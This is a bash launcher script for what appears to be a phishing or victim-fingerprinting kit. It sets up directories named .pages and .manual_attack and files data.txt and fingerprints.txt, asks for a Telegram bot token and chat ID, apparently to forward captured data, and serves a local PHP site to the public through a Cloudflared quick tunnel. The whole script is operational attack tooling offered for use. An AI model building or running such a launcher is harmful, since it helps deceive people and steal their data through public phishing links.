#!/bin/bash

# Function to install necessary packages and tunnels if not already installed
install_packages_and_tunnels() {
    if [[ -f .host/cloudflared ]]; then
        clear
    else
        clear
        if [[ $(uname -o) != Android ]]; then
            bash packages.sh
            bash tunnels.sh
        else
            ./packages.sh
            ./tunnels.sh
        fi
    fi
}

# Function to check if the script is run as root on non-Android systems
check_root_and_os() {
    if [[ $(uname -o) != Android && ${EUID:-$(id -u)} -ne 0 ]]; then
        clear
        echo -e "The program cannot run.\nFor GNU/Linux systems, please run as root.\n"
        exit 1
    fi
}

# Function to set permissions for necessary files and directories
set_permissions() {
    chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
}

# Function to create necessary directories
create_directories() {
    mkdir -p .tunnels_log .www
}

# Function to create or update configuration file
create_or_update_config() {
    config_file=".www/config.ini"
    if [[ -f $config_file ]]; then
        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
        if [[ $choice != "y" ]]; then
            echo "Config update skipped."
            return
        fi
    fi

    read -p "Enter your Telegram bot token: " token
    read -p "Enter your Telegram chat ID: " chat_id

    cat <<EOL >$config_file
[telegram]
token = $token
chat_id = $chat_id
EOL

    echo "Config file created/updated successfully."
}

# Function to start PHP server
start_php_server() {
    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
}

# Function to start Cloudflared tunnel
start_cloudflared() {
    echo -ne "\nStarting Cloudflared..."
    if [[ $(command -v termux-chroot) ]]; then
        termux-chroot ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    else
        ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    fi

    sleep 12
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
    echo -e "\nCloudflared URL: ${cldflr_url}"
}

# Main script execution
install_packages_and_tunnels
check_root_and_os
create_directories
set_permissions
create_or_update_config
start_php_server
start_cloudflared
